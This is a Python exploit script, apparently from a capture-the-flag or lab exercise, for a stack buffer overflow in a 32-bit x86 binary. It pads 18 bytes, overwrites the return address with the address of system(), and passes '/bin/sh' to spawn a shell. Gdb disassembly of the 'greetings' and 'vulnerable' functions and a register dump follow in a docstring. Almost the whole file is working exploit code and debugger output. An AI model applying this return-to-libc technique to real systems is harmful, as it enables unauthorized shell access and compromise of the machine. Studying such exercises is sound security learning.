from struct import pack
import sys

path = b"\x2f\x62\x69\x6e\x2f\x73\x68"
#b"/bin/sh"
#2f 62 69 6e 2f 73 68

offset = b"B"*18 #0x12

# ebp 0xbffeb558
ebp = pack("<I",0xbffeb558)
systemAddr = pack("<I",0x804fcf0)
sys.stdout.buffer.write(offset + systemAddr + systemAddr + ebp + ebp + path)
#sys.stdout.buffer.write(offset + junk + systemAddr + junk + ebp + path)

# overwrting returnaddress to point to a funciton in data
"""
Dump of assembler code for function greetings:
   0x08048c05 <+0>:	push   %ebp
   0x08048c06 <+1>:	mov    %esp,%ebp
   0x08048c08 <+3>:	push   %ebx
   0x08048c09 <+4>:	sub    $0x4,%esp
   0x08048c0c <+7>:	call   0x8048cc9 <__x86.get_pc_thunk.ax>
   0x08048c11 <+12>:	add    $0x913ef,%eax
   0x08048c16 <+17>:	sub    $0xc,%esp
   0x08048c19 <+20>:	lea    -0x2d9b8(%eax),%edx
   0x08048c1f <+26>:	push   %edx
   0x08048c20 <+27>:	mov    %eax,%ebx
   0x08048c22 <+29>:	call   0x804fcf0 <system>
   0x08048c27 <+34>:	add    $0x10,%esp
   0x08048c2a <+37>:	nop
   0x08048c2b <+38>:	mov    -0x4(%ebp),%ebx
   0x08048c2e <+41>:	leave
   0x08048c2f <+42>:	ret


Dump of assembler code for function vulnerable:
   0x08048c30 <+0>:	push   %ebp
   0x08048c31 <+1>:	mov    %esp,%ebp
   0x08048c33 <+3>:	push   %ebx
   0x08048c34 <+4>:	sub    $0x14,%esp
   0x08048c37 <+7>:	call   0x8048cc9 <__x86.get_pc_thunk.ax>
   0x08048c3c <+12>:	add    $0x913c4,%eax
   0x08048c41 <+17>:	sub    $0x8,%esp
   0x08048c44 <+20>:	pushl  0x8(%ebp)
   0x08048c47 <+23>:	lea    -0x12(%ebp),%edx 18 offset
   0x08048c4a <+26>:	push   %edx
   0x08048c4b <+27>:	mov    %eax,%ebx
   0x08048c4d <+29>:	call   0x80481c8
   0x08048c52 <+34>:	add    $0x10,%esp
   0x08048c55 <+37>:	nop
   0x08048c56 <+38>:	mov    -0x4(%ebp),%ebx
   0x08048c59 <+41>:	leave
   0x08048c5a <+42>:	ret
End of assembler dump.

Breakpoint 1, 0x08048c09 in greetings ()
(gdb) info reg
eax            0xffffffff	-1
ecx            0xbffff320	-1073745120
edx            0x0	0
ebx            0x80da000	135110656
esp            0xbffeb554	0xbffeb554
ebp            0xbffeb558	0xbffeb558
esi            0x10	16
edi            0x80481a8	134513064
eip            0x8048c09	0x8048c09 <greetings+4>
eflags         0x286	[ PF SF IF ]
cs             0x73	115
ss             0x7b	123
ds             0x7b	123
es             0x7b	123
fs             0x0	0
gs             0x33	51
"""
